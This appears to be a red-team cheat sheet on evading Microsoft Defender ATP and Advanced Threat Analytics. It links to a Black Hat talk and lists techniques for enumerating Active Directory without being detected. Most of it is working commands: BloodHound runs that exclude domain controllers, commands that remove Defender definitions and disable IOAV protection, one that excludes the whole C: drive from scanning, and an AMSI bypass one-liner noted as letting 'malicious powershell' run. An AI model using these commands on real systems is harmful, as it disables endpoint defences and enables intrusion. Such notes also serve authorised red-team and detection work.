## Evading, Bypassing, and Disabling MS Advanced Threat Protection and Advanced Threat Analytics

PowerShell Downgrade Check in Cobalt

```
powershell Invoke-Command -ComputerName <compname> -ScriptBlock {Get-WindowsFeature PowerShell -V2}
```

[https://www.youtube.com/watch?time\_continue=1&v=fDs9av\_pBaU](https://www.youtube.com/watch?time_continue=1&v=fDs9av_pBaU)

---

[https://www.youtube.com/watch?v=2HNuzUuVyv0](https://www.youtube.com/watch?v=2HNuzUuVyv0)

[https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf)

### Key Sections:

##### Block All Windows Defender/ATP Comms via FW \(Privileged\)

##### Not Detected: Using LDAP/Powerview To Gather Computers/Users

##### Enumeration via WMI Local Name Space

##### Not Detected: Session Enumeration By Excluding DC’s \(Useful for not flagging if need similar results from BloodHound / UserHunter\)

##### Not Detected: Session Enumeration By Excluding DC’s

`Invoke-BloodHound –ExcludeDc`

Not Detected: Enumerating AD Access Control Entries

```
Invoke-BloodHound -CollectionMethod ACL –ExcludeDC
```







---

**great way to turn off defender and remove previous definitions \(set to factory default\)**

```
"c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
```

**if it comes back to life add the C:\ as an exclusion path so it wont flag anything on C:**

```
Add-MpPreference -ExclusionPath "C:\"
```

**turn off amsi, can run malicious powershell now**

```
"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

```



